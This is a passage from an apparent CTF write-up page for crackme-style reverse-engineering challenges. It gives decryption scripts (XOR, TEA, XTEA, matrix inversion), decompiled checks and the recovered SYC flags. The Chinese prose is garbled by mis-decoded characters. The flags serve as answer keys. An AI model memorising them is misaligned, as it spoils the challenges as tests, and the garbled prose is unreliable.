class="built_in">print</span>(<span class="built_in">bytes</span>(pos))</span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">last = [num[k-<span class="number">48</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos]</span><br><span class="line"><span class="built_in">print</span>(last)</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºå°†flagæŒ‰ç…§numæ¥ç¼–åºå·ã€‚</p><p>è¿˜åŸè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">M = matrix(Zmod(<span class="number">32</span>), [[<span class="number">18</span>, <span class="number">29</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">27</span>], [<span class="number">8</span>, <span class="number">31</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">30</span>], [<span class="number">29</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">29</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">28</span>], [<span class="number">11</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">7</span>]])</span><br><span class="line">I = identity_matrix(Zmod(<span class="number">32</span>), <span class="number">5</span>)</span><br><span class="line">L = I*M^-<span class="number">1</span></span><br><span class="line">m = L.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">flag = [table[num.index(m[i])] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># xtd4co_ymiunbbx3Aypsmbzii</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;xtd4co_ymiunbbx3Aypsmbzii&#125;</code></p><p>â€‹</p><h3 id="å¹¸è¿æ•°å­—"><a href="#å¹¸è¿æ•°å­—" class="headerlink" title="å¹¸è¿æ•°å­—"></a>å¹¸è¿æ•°å­—</h3><blockquote><p>è¯•è¯•ä»Šå¤©çš„è¿åŠ¿</p></blockquote><p>æŒ‰é€»è¾‘è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">13</span>,   <span class="number">7</span>,  <span class="number">29</span>,  <span class="number">37</span>,  <span class="number">29</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">57</span>,  <span class="number">44</span>,  <span class="number">63</span>, </span><br><span class="line">   <span class="number">42</span>,  <span class="number">43</span>,  <span class="number">50</span>,  <span class="number">63</span>,  <span class="number">42</span>,  <span class="number">55</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">48</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">45</span>,   <span class="number">1</span>,   <span class="number">7</span>,  <span class="number">49</span>,  <span class="number">43</span>,   <span class="number">1</span>,  <span class="number">57</span>,  <span class="number">31</span>,  <span class="number">59</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">45</span>,  <span class="number">27</span>,  <span class="number">58</span>,   <span class="number">1</span>,  <span class="number">12</span>, <span class="number">111</span>,  <span class="number">57</span>,  <span class="number">54</span>,  <span class="number">42</span>, </span><br><span class="line">   <span class="number">35</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">return</span> k*(k+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    x = [data[i]^(cal(k)%<span class="number">0xd3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line">    <span class="keyword">if</span> x[-<span class="number">1</span>] == <span class="number">125</span>:</span><br><span class="line">        <span class="built_in">print</span>(k, <span class="built_in">bytes</span>(x))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;C0ngratulati0nnnns_You_gAessEd_R1ght&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="å¬è¯´cppå¾ˆéš¾ï¼Ÿ"><a href="#å¬è¯´cppå¾ˆéš¾ï¼Ÿ" class="headerlink" title="å¬è¯´cppå¾ˆéš¾ï¼Ÿ"></a>å¬è¯´cppå¾ˆéš¾ï¼Ÿ</h3><blockquote><p>xxxå¸ˆå‚…å¶ç„¶å¬åˆ°æœ‰äººè¯´cppå¾ˆéš¾ï¼ŒçœŸçš„å¾ˆéš¾å—ï¼Ÿä¸ä¼šå§ï¼Œä¸ä¼šå§ã€‚äºæ˜¯ï¼ŒXå¸ˆå‚…è¿å¿™å‡ºäº†ä¸€é“ç»™å¤§ä¼™å„¿æ¶¨æ¶¨ä¿¡å¿ƒã€‚</p></blockquote><p>åŠ¨è°ƒï¼Œå¾—åˆ°é€»è¾‘ä¸º $[(9+1) \oplus (f_i+10)]-9-1$ã€‚</p><p>çˆ†ç ´è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, -<span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">120</span>, -<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">9</span>+<span class="number">1</span>)^(x+<span class="number">10</span>))-<span class="number">9</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">f=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> cal(j) == c[i]:</span><br><span class="line">            f.append(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYCAnma1nG_y0u_maKe_it_1alaIa~~&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125;</code></p><p>â€‹</p><h3 id="ç æ ‘"><a href="#ç æ ‘" class="headerlink" title="ç æ ‘"></a>ç æ ‘</h3><blockquote><p>ä½ ä¼šå®‰å“å—?æˆ‘åæ­£ä¸ä¼š</p></blockquote><p>jadxæŸ¥çœ‹apkï¼Œç”¨IDAåœ¨soæ–‡ä»¶ä¸­æŸ¥çœ‹ä¸»è¦é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">Java_com_sky_ezreeeee_MainActivity_I0o0I</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v9; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v10; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a3);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a4);</span><br><span class="line">  v6 = A0OWO0A(v10, v9);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;unk_14900, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    v7 = *(<span class="type">unsigned</span> __int8 *)(v6 + i) == (<span class="type">unsigned</span> __int8)dest[i];</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">A0OWO0A</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">const</span> <span class="type">unsigned</span> __int8 *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    a1[i] ^= a2[i % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•å¼‚æˆ–è¿ç®—ï¼Œæå–å¯†æ–‡ï¼š<code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218</code>ï¼Œå¯†é’¥ï¼š<code>Syclove</code>ï¼ŒCyberchefå¼‚æˆ–æ“ä½œå¾— <code>SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;</code>ã€‚</p><p>â€‹</p><h3 id="flower-or-tea"><a href="#flower-or-tea" class="headerlink" title="flower-or-tea"></a>flower-or-tea</h3><blockquote><p>Flower ?or tea? or flower tea?</p></blockquote><p>å»é™¤jmpèŠ±æŒ‡ä»¤ï¼Œå…¨å±€æ›¿æ¢ <code>74 03 75 01 XX</code> ä¸º <code>90 90 90 90 90</code> (NOP)ã€‚</p><p>çœ‹ä¼ªç ä¸ºé­”æ”¹XTEAç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">75</span>,  <span class="number">70</span>, <span class="number">249</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">184</span>,  <span class="number">23</span>, <span class="number">196</span>,  <span class="number">19</span>, <span class="number">167</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">178</span>, <span class="number">232</span>, <span class="number">169</span>,  <span class="number">59</span>, <span class="number">201</span>,  <span class="number">78</span>, <span class="number">228</span>, <span class="number">243</span>, <span class="number">148</span>, </span><br><span class="line">  <span class="number">181</span>,  <span class="number">42</span>, <span class="number">204</span>, <span class="number">181</span>,  <span class="number">44</span>, <span class="number">228</span>,  <span class="number">81</span>,  <span class="number">68</span>, <span class="number">154</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">122</span>,   <span class="number">8</span>, <span class="number">208</span>, <span class="number">200</span>,  <span class="number">83</span>,  <span class="number">73</span>, <span class="number">123</span>,  <span class="number">17</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">148</span>, <span class="number">215</span>, <span class="number">255</span>, <span class="number">155</span>, <span class="number">249</span>,  <span class="number">45</span>, <span class="number">255</span>,  <span class="number">94</span>,  <span class="number">49</span>,  <span class="number">37</span>, </span><br><span class="line">  <span class="number">231</span>,  <span class="number">23</span>, <span class="number">121</span>, <span class="number">153</span>, <span class="number">189</span>, <span class="number">223</span>,  <span class="number">58</span>,  <span class="number">27</span>, <span class="number">135</span>, <span class="number">143</span>, </span><br><span class="line">  <span class="number">172</span>, <span class="number">197</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">112</span>, <span class="number">134</span>, <span class="number">178</span>, <span class="number">105</span>, <span class="number">163</span>, </span><br><span class="line">  <span class="number">246</span>,  <span class="number">90</span>,  <span class="number">36</span>, <span class="number">218</span>, <span class="number">247</span>,  <span class="number">44</span>, <span class="number">175</span>, <span class="number">102</span>, <span class="number">123</span>,  <span class="number">52</span>, </span><br><span class="line">   <span class="number">96</span>,  <span class="number">77</span>, <span class="number">200</span>, <span class="number">185</span>,  <span class="number">47</span>, <span class="number">145</span>,  <span class="number">30</span>, <span class="number">145</span>, <span class="number">155</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">189</span>,  <span class="number">58</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">104</span>, <span class="number">153</span>, <span class="number">197</span>, </span><br><span class="line">  <span class="number">233</span>,  <span class="number">19</span>,   <span class="number">0</span>, <span class="number">160</span>, <span class="number">164</span>,  <span class="number">78</span>,  <span class="number">47</span>, <span class="number">193</span>,  <span class="number">16</span>,  <span class="number">58</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">222</span>, <span class="number">148</span>, <span class="number">213</span>, <span class="number">196</span>, <span class="number">160</span>,  <span class="number">60</span>, <span class="number">152</span>, <span class="number">128</span>,  <span class="number">67</span>, </span><br><span class="line">   <span class="number">72</span>, <span class="number">118</span>,  <span class="number">47</span>, <span class="number">126</span>, <span class="number">137</span>, <span class="number">220</span>,  <span class="number">77</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">166</span>, </span><br><span class="line">   <span class="number">39</span>,  <span class="number">63</span>, <span class="number">153</span>,  <span class="number">49</span>, <span class="number">141</span>, <span class="number">181</span>,  <span class="number">23</span>, <span class="number">229</span>,  <span class="number">74</span>,  <span class="number">96</span>, </span><br><span class="line">  <span class="number">132</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">156</span>, <span class="number">129</span>,  <span class="number">68</span>, <span class="number">224</span>, <span class="number">244</span>, <span class="number">255</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">244</span>,  <span class="number">60</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">32</span>,<span class="number">27</span>,<span class="number">39</span>,<span class="number">44</span>]</span><br><span class="line">rounds = <span class="number">54</span></span><br><span class="line">delta = <span class="number">0x31415927</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">fl = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>][::-<span class="number">1</span>]</span><br><span class="line">    m = decrypt(cc)</span><br><span class="line">    fr = long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>] + fr</span><br><span class="line">    fl += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fl)</span><br><span class="line"><span class="built_in">print</span>(fr)</span><br><span class="line"><span class="built_in">print</span>(fl+fr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="mySelf"><a href="#mySelf" class="headerlink" title="mySelf"></a>mySelf</h3><blockquote><p>Why so serious?</p></blockquote><p>åŠ¨è°ƒï¼Œå¾—åˆ°ç¬¬äºŒä¸ªå¯¹è¾“å…¥çš„åŠ å¯†é€»è¾‘ä¸ºTEAç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">240</span>, <span class="number">249</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">196</span>, <span class="number">148</span>,  <span class="number">97</span>, <span class="number">226</span>,  <span class="number">37</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">121</span>, <span class="number">128</span>,  <span class="number">25</span>, <span class="number">194</span>,  <span class="number">15</span>,  <span class="number">31</span>,  <span class="number">21</span>,  <span class="number">24</span>, <span class="number">106</span>, <span class="number">235</span>, </span><br><span class="line">  <span class="number">197</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">132</span>, <span class="number">133</span>,  <span class="number">58</span>, <span class="number">204</span>,  <span class="number">64</span>, <span class="number">187</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">210</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]</span><br><span class="line">    m = decrypt(cc,k)</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H0w_7o_R@te_YOurs31f_iNtRo?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h3><blockquote><p>ç¾ä¸½çš„IDAæ§åˆ¶æµè§†å›¾ like Rainbow!</p></blockquote><p>LLVMå»å¹³å¦åŒ–ï¼š</p><p><code>python3 deflat.py -f ./rainbow --addr 0x401160</code></p><p>å†ç®€å•é€†å›å»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x627B44508E415865</span>,<span class="number">0x847D6C49547E4A57</span>,<span class="number">0x4877646060955B4F</span>,<span class="number">0x622D3C689F7B4D7D</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        cc[i] -= <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="å°é»„é¸­"><a href="#å°é»„é¸­" class="headerlink" title="å°é»„é¸­"></a>å°é»„é¸­</h3><blockquote><p>å°é»„é¸­çš„é’¥åŒ™è¢«ä¸€ä¸ªå«æ¯—å¤–çš„å¤§åé¸­å·èµ°äº†,ä½ èƒ½å¸®å®ƒæ‰¾åˆ°é’¥åŒ™å—?</p></blockquote><p>pythonåç¼–è¯‘ï¼Œå¾—åˆ°1.pycï¼Œä¿®å¤ä¸º3.7çš„æ–‡ä»¶å¤´ <code>550d0d0a</code>ï¼Œè¿˜åŸpythonä»£ç ã€‚</p><p>å¯†æ–‡ï¼š<code>~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH</code></p><p>Cyberchefè§£ï¼šROT93+Reverse+ROT12</p><p>å¾—åˆ°ï¼š<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3a&#123;s&#125;</code></p><p>ä¿®æ­£ä¸€ä¸‹å¾—flagï¼š<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125;</code></p><p>â€‹</p><h3 id="å¯»æ‰¾åˆéŸ³æœªæ¥"><a href="#å¯»æ‰¾åˆéŸ³æœªæ¥" 